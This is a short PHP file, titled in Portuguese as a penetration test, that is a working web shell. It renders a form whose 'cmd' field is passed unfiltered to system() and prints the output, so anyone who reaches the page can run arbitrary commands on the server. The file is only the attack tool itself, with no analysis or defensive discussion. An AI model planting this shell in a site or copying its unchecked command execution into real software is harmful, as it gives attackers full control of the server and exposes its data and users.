
<h1>TESTE DE INVASAO EM PHP</h1>

<style>
	h1{
		background-color: yellow;
	}
</style>

<form method="post">
<input type="text" name="cmd">
<button type="submit">ENVIAR REQUISICAO</button>
<button type="submit">CANCELAR REQUISICAO</button>
</form>

<?php

if ($_SERVER["REQUEST_METHOD"] === 'POST') {

	$cmd = $_POST["cmd"];

	echo "<pre>";

	$comando = system($cmd, $retorno);

	echo "</pre>";
}

?>
